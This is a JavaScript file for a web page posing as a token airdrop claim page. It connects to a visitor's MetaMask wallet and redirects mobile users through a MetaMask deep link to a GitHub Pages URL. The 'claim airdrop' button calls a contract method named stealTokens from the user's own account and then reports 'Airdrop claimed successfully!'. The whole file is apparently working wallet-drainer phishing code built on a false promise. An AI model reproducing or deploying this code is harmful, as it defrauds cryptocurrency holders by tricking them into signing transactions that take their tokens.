let web3;
let accounts;
let contractAddress;
let tokenAddress;
let contractABI;

// Function to load configuration and ABI files
async function loadConfig() {
    try {
        const configResponse = await fetch('config.json');
        if (!configResponse.ok) {
            throw new Error('Failed to fetch config.json');
        }
        const configData = await configResponse.json();
        contractAddress = configData.contractAddress;
        tokenAddress = configData.tokenAddress;

        const abiResponse = await fetch('abi.json');
        if (!abiResponse.ok) {
            throw new Error('Failed to fetch abi.json');
        }
        const abiData = await abiResponse.json();
        contractABI = abiData;

        console.log("Configuration loaded:", configData);
        console.log("ABI loaded:", abiData);
    } catch (error) {
        console.error("Error loading config or ABI: ", error);
        alert("Error loading configuration or ABI. Please try again later.");
    }
}

// Function to check device and handle MetaMask redirection
function redirectToMetaMask() {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    if (isMobile) {
        console.log("Mobile device detected. Redirecting to MetaMask browser...");
        const deepLinkURL = "https://metamask.app.link/dapp/buyemon.github.io/metamask/index3.html";
        window.open(deepLinkURL, "_self");

        setTimeout(() => {
            alert("If MetaMask did not open, manually paste this URL: https://buyemon.github.io/metamask/index3.html");
        }, 3000);
    } else {
        console.log("Non-mobile device detected. Prompting for MetaMask installation...");
        alert("MetaMask is required to use this application. Please install MetaMask.");
    }
}

// Function to connect to MetaMask
async function connectMetaMask() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            console.log("Connected accounts:", accounts);

            document.getElementById('claimAirdropButton').disabled = false;
            document.getElementById('connectButton').disabled = true;
        } catch (error) {
            alert('MetaMask connection failed');
            console.error('MetaMask connection error:', error);
        }
    } else {
        redirectToMetaMask();
    }
}

// Function to claim the airdrop
async function claimAirdrop() {
    if (!accounts) {
        alert('Please connect to MetaMask first!');
        return;
    }

    if (!contractABI || !contractAddress) {
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        console.log('Claiming airdrop...');
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        alert('Error claiming airdrop');
        console.error('Claim error:', error);
    }
}

// Add event listeners to the buttons
window.addEventListener('DOMContentLoaded', async (event) => {
    await loadConfig();
    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
    redirectToMetaMask(); // Trigger redirection logic
});
